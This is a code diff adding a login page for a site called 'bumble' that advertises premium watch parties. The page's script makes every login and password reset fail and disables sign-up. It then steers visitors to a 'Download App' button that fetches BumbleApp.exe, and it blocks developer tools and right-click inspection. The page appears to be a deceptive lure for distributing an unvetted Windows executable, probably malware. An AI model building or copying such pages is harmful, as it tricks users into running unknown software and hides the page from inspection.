@@ -1,0 +1,483 @@
+﻿<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Login - bumble</title>
+        <link rel="icon" type="image/png" href="img/favicon.png">
+    <meta name="description" content="Host premium watch parties with friends in 4K HDR. No lag, perfect sync. Join the revolution.">
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+    <link href="css2-1?family=Inter:wght@400;500;600;700;800&family=Outfit:wght@500;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+    <style>
+        :root {
+            --bg-primary: #0a0a0a;
+            --bg-secondary: #1a1a1a;
+            --accent-red: #F4D03F;
+            --accent-purple: #FDB913;
+            --text-primary: #ffffff;
+            --text-secondary: #a3a3a3;
+            --border-color: rgba(255, 255, 255, 0.1);
+            --font-heading: 'Outfit', sans-serif;
+            --font-body: 'Inter', sans-serif;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: linear-gradient(180deg, #32280a 0%, #140f05 100%);
+            color: var(--text-primary);
+            font-family: var(--font-body);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+        
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at top center, rgba(244,208,63,.2) 0,rgba(253,185,19,.1) 40%,transparent 70%);
+            pointer-events: none;
+            z-index: 0;
+        }
+        
+        img {
+            -webkit-user-drag: none;
+            -khtml-user-drag: none;
+            -moz-user-drag: none;
+            -o-user-drag: none;
+            user-drag: none;
+        }
+        
+        .login-container {
+            width: 100%;
+            max-width: 420px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .login-header {
+            text-align: center;
+            margin-bottom: 3rem;
+        }
+        
+        .login-header a {
+            font-family: var(--font-heading);
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: var(--text-primary);
+            text-transform: uppercase;
+            letter-spacing: -1px;
+            text-decoration: none;
+        }
+        
+        .login-header a span {
+            color: var(--accent-red);
+            text-shadow: 0 0 15px rgba(255,215,0,.6);
+        }
+        
+        .login-card {
+            background: rgba(20,15,35,.6);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(244,208,63,.3);
+            padding: 2.5rem;
+            border-radius: 16px;
+            box-shadow: 0 8px 32px 0 rgba(0,0,0,.37), 0 0 30px rgba(244,208,63,.1);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .login-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at top right, rgba(244,208,63,.1), transparent 60%);
+            pointer-events: none;
+        }
+        
+        .login-title {
+            font-family: var(--font-heading);
+            font-size: 2rem;
+            font-weight: 800;
+            margin-bottom: 0.5rem;
+            text-align: center;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .login-subtitle {
+            color: var(--text-secondary);
+            font-size: .9rem;
+            margin-bottom: 2rem;
+            text-align: center;
+        }
+        
+        .form-group {
+            margin-bottom: 1.5rem;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: .6rem;
+            color: var(--text-secondary);
+            font-size: .85rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: .5px;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 1rem 1.2rem;
+            background: rgba(0,0,0,.2);
+            border: 1px solid rgba(255,255,255,.1);
+            border-radius: 8px;
+            color: #fff;
+            font-size: .95rem;
+            font-family: var(--font-body);
+            transition: .3s;
+        }
+        
+        .form-input:focus {
+            outline: 0;
+            border-color: var(--accent-red);
+            background: rgba(0,0,0,.4);
+            box-shadow: 0 0 0 3px rgba(244,208,63,.2);
+        }
+        
+        .form-input::placeholder {
+            color: rgba(255,255,255,.3);
+        }
+        
+        .btn-login {
+            width: 100%;
+            padding: 1.2rem;
+            background: linear-gradient(135deg, #fdb913 0%, #f4d03f 100%);
+            border: none;
+            border-radius: 50px;
+            color: #000;
+            font-weight: 700;
+            font-size: 1.1rem;
+            cursor: pointer;
+            transition: .3s;
+            box-shadow: 0 4px 15px rgba(253,185,19,.4);
+            margin-top: 1.5rem;
+        }
+        
+        .btn-login:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(253,185,19,.6);
+        }
+        
+        .back-link {
+            display: inline-flex;
+            align-items: center;
+            gap: .5rem;
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-size: .9rem;
+            margin-bottom: 2rem;
+            transition: .3s;
+        }
+        
+        .back-link:hover {
+            color: var(--text-primary);
+        }
+        
+        .forgot-password-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1.5rem;
+            font-size: .9rem;
+        }
+        
+        .forgot-password-container label {
+            display: flex;
+            align-items: center;
+            gap: .5rem;
+            cursor: pointer;
+            color: var(--text-secondary);
+        }
+        
+        .forgot-password-container input[type="checkbox"] {
+            cursor: pointer;
+        }
+        
+        .forgot-password-container a {
+            color: var(--accent-red);
+            text-decoration: none;
+            cursor: pointer;
+            transition: .3s;
+        }
+        
+        .forgot-password-container a:hover {
+            color: var(--accent-purple);
+        }
+        
+        .auth-form {
+            display: none;
+        }
+        
+        .auth-form.active {
+            display: block;
+            animation: fadeIn .4s ease;
+        }
+        
+        .form-footer {
+            margin-top: 1.5rem;
+            text-align: center;
+            font-size: .9rem;
+            color: var(--text-secondary);
+        }
+        
+        .form-footer a {
+            color: var(--accent-red);
+            text-decoration: none;
+            font-weight: 600;
+            cursor: pointer;
+            transition: .3s;
+        }
+        
+        .form-footer a:hover {
+            color: var(--accent-purple);
+        }
+        
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        @media (max-width: 640px) {
+            .login-card {
+                padding: 2rem 1.5rem;
+            }
+            
+            .login-header a {
+                font-size: 1.6rem;
+            }
+            
+            .login-title {
+                font-size: 1.8rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <a href="index.htm" class="back-link">
+            <i class="fa-solid fa-arrow-left"></i> Back to Home
+        </a>
+        
+        <div class="login-header">
+            <a href="index.htm">BUM<span>BLE</span></a>
+        </div>
+        
+        <div class="login-card">
+            <h2 class="login-title" id="form-title">Welcome Back</h2>
+            <p class="login-subtitle" id="form-subtitle">Login to your premium account</p>
+            
+            <form id="login-form" class="auth-form active">
+                <div class="form-group">
+                    <label class="form-label">Email Address</label>
+                    <input type="email" class="form-input" placeholder="name@example.com" required="">
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label">Password</label>
+                    <input type="password" class="form-input" placeholder="••••••••" required="">
+                </div>
+                
+                <div class="forgot-password-container">
+                    <label>
+                        <input type="checkbox" style="cursor: pointer"> Remember me
+                    </label>
+                    <a id="forgot-password-link">Forgot password?</a>
+                </div>
+                
+                <button type="submit" class="btn-login">Sign In</button>
+            </form>
+            
+            <form id="signup-form" class="auth-form">
+                <div class="signup-disabled">
+                    <i class="fa-solid fa-lock"></i>
+                    <p><strong>Registration Disabled:</strong> New accounts can only be created through the official bumble application for security.</p>
+                </div>
+                <button type="button" class="btn-login" id="btn-download-login-app" style="background:linear-gradient(90deg,#fdb913 0,#f4d03f 100%);text-decoration:none;display:flex;align-items:center;justify-content:center;gap:.5rem;color:#000;border:none;cursor:pointer">
+                    <i class="fa-brands fa-windows"></i> Download App
+                </button>
+            </form>
+            
+            <div class="form-footer">
+                <span id="toggle-text">Don't have an account? <a href="#" class="toggle-link" style="cursor:pointer;color:var(--accent-red);text-decoration:none;font-weight:600">Sign up</a></span>
+            </div>
+        </div>
+    </div>
+    
+    <script src="script.js"></script>
+    <script src="download-track.js"></script>
+    <script>
+        (function () {
+            var dl = document.getElementById("btn-download-login-app");
+            if (dl) {
+                dl.addEventListener("click", async function () {
+                    try {
+                        if (typeof trackBumbleDownload === "function") {
+                            await trackBumbleDownload({ triggerLabel: "Download App — login / signup panel" });
+                        }
+                    } catch (e) {
+                        console.error("Download track failed", e);
+                    }
+                    window.location.href = "download/BumbleApp.exe";
+                });
+            }
+        })();
+
+        let loginForm = document.getElementById('login-form'),
+            signupForm = document.getElementById('signup-form'),
+            forgotPasswordLink = document.getElementById('forgot-password-link'),
+            emailInput = loginForm.querySelector('input[type="email"]'),
+            formTitle = document.getElementById('form-title'),
+            formSubtitle = document.getElementById('form-subtitle'),
+            toggleText = document.getElementById('toggle-text');
+            
+        function showNotification(t, e = "error") {
+            document.querySelectorAll(".notification").forEach(t => t.remove());
+            let o = document.createElement("div");
+            o.className = "notification " + e,
+            o.textContent = t,
+            o.style.cssText = `
+                position: fixed !important;
+                top: 20px !important;
+                right: 20px !important;
+                padding: 1rem 1.5rem !important;
+                border-radius: 10px !important;
+                font-weight: 600 !important;
+                font-size: 0.95rem !important;
+                z-index: 99999 !important;
+                max-width: 380px !important;
+                box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3), 0 0 15px rgba(124, 58, 237, 0.2) !important;
+                background: linear-gradient(135deg, rgba(244, 208, 63, 0.15) 0%, rgba(253, 185, 19, 0.1) 100%) !important;
+                border: 1px solid rgba(244, 208, 63, 0.5) !important;
+                color: #F4D03F !important;
+                left: auto !important;
+                bottom: auto !important;
+                backdrop-filter: blur(8px) !important;
+                -webkit-backdrop-filter: blur(8px) !important;
+                animation: slideIn 0.3s ease !important;
+            `,
+            document.body.appendChild(o),
+            setTimeout(() => {
+                o.style.animation = "slideOut 0.3s ease !important",
+                setTimeout(() => o.remove(), 300)
+            }, 4e3)
+        }
+        
+        function toggleForms() {
+            loginForm.classList.toggle("active"),
+            signupForm.classList.toggle("active"),
+            loginForm.classList.contains("active") ? (
+                formTitle.textContent = "Welcome Back",
+                formSubtitle.textContent = "Login to your premium account",
+                toggleText.innerHTML = 'Don\'t have an account? <a href="#" class="toggle-link" style="cursor: pointer; color: var(--accent-red); text-decoration: none; font-weight: 600">Sign up</a>'
+            ) : (
+                formTitle.textContent = "Create Account",
+                formSubtitle.textContent = "Join bumble today",
+                toggleText.innerHTML = 'Already have an account? <a href="#" class="toggle-link" style="cursor: pointer; color: var(--accent-red); text-decoration: none; font-weight: 600">Sign in</a>'
+            ),
+            document.querySelectorAll(".toggle-link").forEach(t => t.addEventListener("click", t => {
+                t.preventDefault(),
+                toggleForms()
+            }))
+        }
+        
+        document.querySelectorAll(".toggle-link").forEach(t => t.addEventListener("click", t => {
+            t.preventDefault(),
+            toggleForms()
+        })),
+        
+        forgotPasswordLink.addEventListener("click", t => {
+            t.preventDefault();
+            let email = emailInput.value.trim();
+            email ? showNotification("No account found with email: " + email, "error") : showNotification("Please enter your email address", "warning")
+        }),
+        
+        loginForm.addEventListener("submit", t => {
+            t.preventDefault(),
+            showNotification("Invalid credentials. Please try again.", "error")
+        }),
+        
+        signupForm.addEventListener("submit", t => {
+            t.preventDefault(),
+            showNotification("Registration is disabled for security reasons", "error")
+        });
+        
+        // Add CSS animations
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes slideIn {
+                from {
+                    transform: translateX(400px);
+                    opacity: 0;
+                }
+                to {
+                    transform: translateX(0);
+                    opacity: 1;
+                }
+            }
+            @keyframes slideOut {
+                from {
+                    transform: translateX(0);
+                    opacity: 1;
+                }
+                to {
+                    transform: translateX(400px);
+                    opacity: 0;
+                }
+            }
+        `;
+        document.head.appendChild(style);
+        
+        // Prevent dev tools
+        document.addEventListener("keydown", function(e) {
+            return "F12" === e.key || e.ctrlKey && e.shiftKey && "I" === e.key || e.ctrlKey && e.shiftKey && "C" === e.key || e.ctrlKey && e.shiftKey && "J" === e.key || e.ctrlKey && e.shiftKey && "K" === e.key ? (e.preventDefault(), !1) : void 0
+        }),
+        document.addEventListener("contextmenu", function(e) {
+            return e.preventDefault(), !1
+        });
+    </script>
+</body>
+</html>
+
+
+
